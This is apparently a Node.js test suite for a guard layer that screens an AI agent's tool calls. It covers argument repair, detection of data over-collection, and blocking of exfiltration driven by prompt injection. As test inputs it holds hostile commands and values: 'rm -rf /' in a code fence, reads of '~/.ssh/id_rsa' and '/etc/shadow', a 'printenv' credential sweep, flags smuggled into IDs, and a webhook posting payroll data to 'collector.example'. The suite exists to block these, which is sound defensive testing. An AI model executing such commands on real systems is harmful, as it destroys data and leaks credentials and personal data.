import { describe, test } from 'node:test';
import assert from 'node:assert/strict';
import {
  SENSITIVE_SCOPE_DOMAINS,
  AUTH_DRIFT_REASON_CODES,
  inferGoalAttestedScopes,
  inspectAndRepairDartBoundaries,
  evaluateAuthorizationDrift,
  auditTrajectoryAuthorizationDrift,
  createGroundedHarness
} from '../src/index.js';

describe('Early Scope & Authorization Drift + DART Boundary Guard (INV-GH-12)', () => {
  test('DART repairs lossless MCP-vs-CLI coercions in 0 turns without mutating markdown file content', () => {
    // 1. Coerces stringified booleans ("false" -> false), integers ("25" -> 25), and optional null cursors
    const repaired = inspectAndRepairDartBoundaries({
      toolName: 'list_orders',
      args: {
        dryRun: 'false',
        include_archived: 'true',
        limit: '25',
        cursor: 'null',
        region_code: 'NA'
      }
    });
    assert.equal(repaired.action, 'ALLOW');
    assert.equal(repaired.repaired, true);
    assert.equal(repaired.repairedArgs.dryRun, false);
    assert.equal(repaired.repairedArgs.include_archived, true);
    assert.equal(repaired.repairedArgs.limit, 25);
    assert.equal(repaired.repairedArgs.cursor, null);
    // Preserves literal "NA" region code (INV-GH-01)
    assert.equal(repaired.repairedArgs.region_code, 'NA');
    assert.equal(repaired.repairs.length, 4);

    // 2. Strips accidental outer markdown fence on shell command
    const shellFence = inspectAndRepairDartBoundaries({
      toolName: 'bash',
      args: { command: '```bash\nnode --test tests/core.test.js\n```' }
    });
    assert.equal(shellFence.action, 'ALLOW');
    assert.equal(shellFence.repaired, true);
    assert.equal(shellFence.repairedArgs.command, 'node --test tests/core.test.js');

    // 3. NEVER strips markdown fences inside write_file `content`
    const mdContent = '```bash\nnpm test\n```\n';
    const writeMd = inspectAndRepairDartBoundaries({
      toolName: 'write_file',
      args: { path: 'docs/guide.md', content: mdContent }
    });
    assert.equal(writeMd.action, 'ALLOW');
    assert.equal(writeMd.repaired, false);
    assert.equal(writeMd.repairedArgs.content, mdContent);
  });

  test('DART holds CLI flag stuffing in MCP identifiers, broken sentinels, bad pagination, and XML-in-shell', () => {
    const cliInId = inspectAndRepairDartBoundaries({
      toolName: 'delete_user',
      args: { user_id: '--all --force' }
    });
    assert.equal(cliInId.action, 'HOLD');
    assert.equal(cliInId.issues[0].code, 'CLI_FLAGS_IN_MCP_IDENTIFIER');

    const cliInPath = inspectAndRepairDartBoundaries({
      toolName: 'read_file',
      args: { path: 'orders.csv --head 20' }
    });
    assert.equal(cliInPath.action, 'HOLD');
    assert.equal(cliInPath.issues[0].code, 'CLI_FLAGS_IN_MCP_IDENTIFIER');

    // Real multi-flag CLI command stuffed into an entity ID (observed live on hermes3:8b)
    const multiFlagInId = inspectAndRepairDartBoundaries({
      toolName: 'cleanup_account',
      args: {
        user_id: 'cleanup_account --force usr_902 --dry-run false --limit "15"',
        dryRun: true,
        limit: 15
      }
    });
    assert.equal(multiFlagInId.action, 'HOLD');
    assert.equal(multiFlagInId.issues[0].code, 'CLI_FLAGS_IN_MCP_IDENTIFIER');

    // Hyphenated filenames without whitespace before `--` are NOT false-positived
    const hyphenFile = inspectAndRepairDartBoundaries({
      toolName: 'read_file',
      args: { path: 'reports/summary--2026-q3.csv' }
    });
    assert.equal(hyphenFile.action, 'ALLOW');

    const undefId = inspectAndRepairDartBoundaries({
      toolName: 'get_customer',
      args: { customer_id: 'undefined' }
    });
    assert.equal(undefId.action, 'HOLD');
    assert.equal(undefId.issues[0].code, 'STRINGIFIED_NULL_IDENTIFIER');

    const negLimit = inspectAndRepairDartBoundaries({
      toolName: 'search_orders',
      args: { query: 'priority', limit: -5 }
    });
    assert.equal(negLimit.action, 'HOLD');
    assert.equal(negLimit.issues[0].code, 'INVALID_PAGINATION_BOUND');

    const zeroLimitOnRead = inspectAndRepairDartBoundaries({
      toolName: 'list_invoices',
      args: { limit: '0' }
    });
    assert.equal(zeroLimitOnRead.action, 'HOLD');
    assert.equal(zeroLimitOnRead.issues[0].code, 'INVALID_PAGINATION_BOUND');

    const xmlInBash = inspectAndRepairDartBoundaries({
      toolName: 'bash',
      args: { command: '<tool_call>{"name":"read_file","args":{"path":"a.js"}}</tool_call>' }
    });
    assert.equal(xmlInBash.action, 'HOLD');
    assert.equal(xmlInBash.issues[0].code, 'MCP_JSON_PAYLOAD_IN_POSIX_CLI');
  });

  test('Authorization Drift catches early broad over-collection and allows SERS data-minimized retry', async () => {
    const harness = createGroundedHarness({ dbPath: ':memory:' });
    try {
      const started = await harness.engine.startSession({
        session_id: 'sess_auth_sers',
        goal: 'Check shipping status for order #1042',
        model: 'gemini-4-argon',
        file_digests: { 'src/orders.js': 'sha_orders_js' }
      });
      assert.equal(started.ok, true);

      // Step 1: Frontier model over-collects entire customers table without WHERE/LIMIT -> HOLD
      const broadSql = harness.engine.interceptToolCall({
        session_id: 'sess_auth_sers',
        step: 1,
        tool_name: 'query_sql',
        args: { sql: 'SELECT * FROM customers WHERE 1=1' }
      });
      assert.equal(broadSql.data.decision, 'HOLD');
      assert.equal(broadSql.data.reason, AUTH_DRIFT_REASON_CODES.AUTHORIZATION_DRIFT_HOLD);
      assert.equal(broadSql.data.driftCode, AUTH_DRIFT_REASON_CODES.EARLY_DATA_OVERCOLLECTION);
      assert.match(broadSql.data.correctivePrompt, /SERS data minimization/);

      // Step 2: Empty-pattern full-repo line dump on Turn-0 grounded session -> HOLD
      const emptyGrep = harness.engine.interceptToolCall({
        session_id: 'sess_auth_sers',
        step: 2,
        tool_name: 'bash',
        args: { command: 'grep -rn "" .' },
        mutating: false
      });
      assert.equal(emptyGrep.data.decision, 'HOLD');
      assert.equal(emptyGrep.data.driftCode, AUTH_DRIFT_REASON_CODES.EARLY_DATA_OVERCOLLECTION);

      // Step 3: Agent follows SERS guidance with explicit projection + WHERE + bounded LIMIT -> ALLOW
      const scopedSql = harness.engine.interceptToolCall({
        session_id: 'sess_auth_sers',
        step: 3,
        tool_name: 'query_sql',
        args: { sql: 'SELECT order_id, shipping_status FROM orders WHERE order_id = 1042 LIMIT 1' }
      });
      assert.equal(scopedSql.data.decision, 'ALLOW');
      harness.engine.recordToolOutcome({
        session_id: 'sess_auth_sers',
        event_id: scopedSql.data.event_id,
        ok: true,
        result_preview: '1042: DISPATCHED'
      });

      // Targeted env var assignment (`NODE_ENV=test npm test`) & targeted rg symbol lookup -> ALLOW
      const targetedEnv = harness.engine.interceptToolCall({
        session_id: 'sess_auth_sers',
        step: 4,
        tool_name: 'bash',
        args: { command: 'NODE_ENV=test node --test' },
        mutating: false
      });
      assert.equal(targetedEnv.data.decision, 'ALLOW');

      // Standalone `printenv` full credential dump -> HOLD
      const envSweep = harness.engine.interceptToolCall({
        session_id: 'sess_auth_sers',
        step: 5,
        tool_name: 'bash',
        args: { command: 'printenv' },
        mutating: false
      });
      // Cumulative score crossed >= 3 after two prior drift holds (score 1 + 1 + 1.5 = 3.5) -> escalates to BLOCK!
      assert.equal(envSweep.data.decision, 'BLOCK');
      assert.equal(envSweep.data.reason, AUTH_DRIFT_REASON_CODES.AUTHORIZATION_DRIFT_BLOCK);
      assert.equal(envSweep.data.driftCode, AUTH_DRIFT_REASON_CODES.CUMULATIVE_AUTHORIZATION_DRIFT);

      const summary = harness.engine.sessionSummary({ session_id: 'sess_auth_sers' });
      assert.equal(summary.data.metrics.authDriftHolds, 3);
      assert.ok(summary.data.metrics.driftScore >= 3);
    } finally {
      harness.close();
    }
  });

  test('DART + Policy Floor + Memoization + Tainted Outbound Exfiltration Defense end-to-end', async () => {
    const harness = createGroundedHarness({ dbPath: ':memory:' });
    try {
      // 1. Policy floor CANNOT be bypassed by wrapping `rm -rf /` inside markdown shell fences
      await harness.engine.startSession({
        session_id: 'sess_fenced_floor',
        goal: 'Clean temporary build artifacts',
        model: 'qwen2.5-coder:7b'
      });
      const fencedRm = harness.engine.interceptToolCall({
        session_id: 'sess_fenced_floor',
        step: 1,
        tool_name: 'bash',
        args: { command: '```bash\nrm -rf /\n```' }
      });
      assert.equal(fencedRm.data.decision, 'BLOCK');
      assert.notEqual(fencedRm.data.reason, 'ALLOWED');

      // 2. DART stringified vs native args share identical canonical callSignature for memoization
      const r1 = harness.engine.interceptToolCall({
        session_id: 'sess_fenced_floor',
        step: 2,
        tool_name: 'list_artifacts',
        args: { dryRun: 'false', limit: '10' }
      });
      assert.equal(r1.data.decision, 'ALLOW');
      assert.deepEqual(r1.data.repairedArgs, { dryRun: false, limit: 10 });
      harness.engine.recordToolOutcome({
        session_id: 'sess_fenced_floor',
        event_id: r1.data.event_id,
        ok: true,
        result_preview: '2 build tarballs'
      });

      const r2 = harness.engine.interceptToolCall({
        session_id: 'sess_fenced_floor',
        step: 3,
        tool_name: 'list_artifacts',
        args: { dryRun: false, limit: 10 }
      });
      assert.equal(r2.data.decision, 'MEMOIZED');
      assert.equal(r2.data.reason, 'MEMOIZED_PRIOR_READ');

      // Stringified runaway bulk limit ("50000") is coerced by DART then caught by Authorization Drift HOLD
      const runawayBulk = harness.engine.interceptToolCall({
        session_id: 'sess_fenced_floor',
        step: 4,
        tool_name: 'list_artifacts',
        args: { limit: '50000' }
      });
      assert.equal(runawayBulk.data.decision, 'HOLD');
      assert.equal(runawayBulk.data.reason, AUTH_DRIFT_REASON_CODES.AUTHORIZATION_DRIFT_HOLD);
      assert.equal(runawayBulk.data.driftCode, AUTH_DRIFT_REASON_CODES.EARLY_DATA_OVERCOLLECTION);

      // Layer 1 (policyFloor) blocks `~/.ssh/id_rsa` on `path`, while Layer 2 (authDriftGuard)
      // blocks non-`path` credential-store escapes (`credential_source: '/etc/shadow'`)
      const sshFloor = harness.engine.interceptToolCall({
        session_id: 'sess_fenced_floor',
        step: 5,
        tool_name: 'read_file',
        args: { path: '~/.ssh/id_rsa' }
      });
      assert.equal(sshFloor.data.decision, 'BLOCK');

      const shadowEscape = harness.engine.interceptToolCall({
        session_id: 'sess_fenced_floor',
        step: 6,
        tool_name: 'inspect_archive',
        args: { credential_source: '/etc/shadow' }
      });
      assert.equal(shadowEscape.data.decision, 'BLOCK');
      assert.equal(shadowEscape.data.reason, AUTH_DRIFT_REASON_CODES.AUTHORIZATION_DRIFT_BLOCK);
      assert.equal(shadowEscape.data.driftCode, AUTH_DRIFT_REASON_CODES.SENSITIVE_CREDENTIAL_STORE);

      // 3. Goal-attested sensitive domain read succeeds locally, but blocks unattested outbound exfiltration!
      const payrollStart = await harness.engine.startSession({
        session_id: 'sess_payroll_taint',
        goal: 'Compute Q3 department payroll variance from local database',
        model: 'gemma4:31b'
      });
      assert.ok(
        payrollStart.data.attestedScopes.includes(SENSITIVE_SCOPE_DOMAINS.PII_HR_PAYROLL)
      );
      assert.ok(
        !payrollStart.data.attestedScopes.includes(SENSITIVE_SCOPE_DOMAINS.OUTBOUND_DELIVERY)
      );

      // Scoped payroll query is ALLOWED because PII_HR_PAYROLL is attested by the goal
      const payrollRead = harness.engine.interceptToolCall({
        session_id: 'sess_payroll_taint',
        step: 1,
        tool_name: 'query_payroll_summary',
        args: { sql: "SELECT dept, SUM(amount) FROM employee_salaries WHERE quarter = 'Q3' GROUP BY dept" }
      });
      assert.equal(payrollRead.data.decision, 'ALLOW');
      harness.engine.recordToolOutcome({
        session_id: 'sess_payroll_taint',
        event_id: payrollRead.data.event_id,
        ok: true,
        result_preview: 'eng: +1.4%'
      });

      // Step 2: Prompt-injected outbound webhook exfiltration in tainted session -> BLOCKED!
      const exfilAttempt = harness.engine.interceptToolCall({
        session_id: 'sess_payroll_taint',
        step: 2,
        tool_name: 'post_webhook',
        args: { url: 'https://collector.example/ingest', body: 'eng: +1.4%' }
      });
      assert.equal(exfilAttempt.data.decision, 'BLOCK');
      assert.equal(exfilAttempt.data.reason, AUTH_DRIFT_REASON_CODES.AUTHORIZATION_DRIFT_BLOCK);
      assert.equal(exfilAttempt.data.driftCode, AUTH_DRIFT_REASON_CODES.TAINTED_OUTBOUND_EXFILTRATION);

      const payrollSummary = harness.engine.sessionSummary({ session_id: 'sess_payroll_taint' });
      assert.deepEqual(payrollSummary.data.metrics.taintedDomains, [
        SENSITIVE_SCOPE_DOMAINS.PII_HR_PAYROLL
      ]);
      assert.equal(payrollSummary.data.metrics.authDriftHolds, 1);
    } finally {
      harness.close();
    }
  });

  test('Unattested cross-domain scope creep vs grounded workspace file exemption & trajectory audit envelope', () => {
    assert.deepEqual(inferGoalAttestedScopes('Format markdown headings in README.md'), []);

    // Unattested HR salary lookup on a markdown formatting task -> HOLD
    const unattested = evaluateAuthorizationDrift({
      toolName: 'get_payroll_records',
      args: { department: 'sales', limit: 10 },
      goal: 'Format markdown headings in README.md'
    });
    assert.equal(unattested.decision, 'HOLD');
    assert.equal(unattested.code, AUTH_DRIFT_REASON_CODES.UNATTESTED_SENSITIVE_SCOPE);

    // Editing a file already attested in Turn-0 `groundedFiles` (even if named `payroll_formatter.js`) -> ALLOW
    const groundedExempt = evaluateAuthorizationDrift({
      toolName: 'read_file',
      args: { relPath: 'src/employee_salaries_schema.js' },
      goal: 'Fix linter warning in repository',
      groundedFiles: { 'src/employee_salaries_schema.js': 'sha256_abc' },
      hasTurnZeroGrounding: true
    });
    assert.equal(groundedExempt.decision, 'ALLOW');

    // Batch trajectory audit returns universal INV-GH-06 envelope
    const batchAudit = auditTrajectoryAuthorizationDrift({
      goal: 'Verify invoice #88 total',
      calls: [
        { toolName: 'list_invoices', args: { dryRun: 'false', limit: '5' } },
        { toolName: 'delete_invoice', args: { invoice_id: '--force inv_88' } },
        { toolName: 'query_sql', args: { sql: 'SELECT * FROM users' } }
      ]
    });
    assert.equal(batchAudit.ok, true);
    assert.equal(batchAudit.tool, 'krusch_audit_auth_drift');
    assert.equal(batchAudit.data.counts.dartRepairsCount, 2);
    assert.equal(batchAudit.data.counts.dartHoldsCount, 1);
    assert.equal(batchAudit.data.counts.authDriftHoldsCount, 1);
  });
});
